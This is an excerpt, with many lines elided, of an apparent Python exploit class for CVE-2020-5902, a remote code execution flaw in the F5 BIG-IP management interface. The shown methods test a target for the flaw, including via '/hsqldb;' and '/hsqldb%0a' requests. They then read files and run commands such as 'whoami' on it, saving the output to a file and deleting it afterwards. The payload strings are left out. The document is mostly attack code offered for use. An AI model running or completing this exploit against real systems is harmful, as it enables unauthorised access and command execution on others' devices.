...
class CVE_2020_5902_BaseVerify:
    ...
    def check(self):
        ...
        if 'password_policy_table' in check_req.text:
            return True
        hsqldbRsp = requests.get(self.url + '/hsqldb;', headers = self.headers, allow_redirects = False, verify = False)
        if 'HSQL Database Engine' in hsqldbRsp.text and hsqldbRsp.status_code == 200:
            return True
        hsqldbRsp1 = requests.get(self.url + '/hsqldb%0a', headers = self.headers, allow_redirects = False, verify = False)
    ...
    def readfile(self):
        ...
        try:
            if self.check():
                read_req = requests.get(self.url + self.read_payload, headers = self.headers, allow_redirects = False, verify = False)
    ...
    def cmd(self):
        ...
        try:
            if self.check():
                ...
                cmd_req = requests.get(cmd_url)
                cmd_str = json.dumps(cmd_req.headers.__dict__['_store'])
                if cmd_req.status_code == 200 and 'tmui' in cmd_str:
                    filesave_req = requests.get(self.url + self.filesave_payload.format(self.file, 'whoami'), allow_redirects = False, verify = False)
                    filesave_str = json.dumps(filesave_req.headers.__dict__['_store'])
                    if filesave_req.status_code == 200 and 'tmui' in filesave_str:
                        list_req = requests.get(self.url + self.list_payload, allow_redirects = False, verify = False)
                        ...
                        if list_req.status_code == 200 and 'tmui' in list_str:
                            if len(list_req.text) > 33:
                                ...
                                delete_req = requests.get(self.url + self.delete_payload, allow_redirects = False, verify = False)
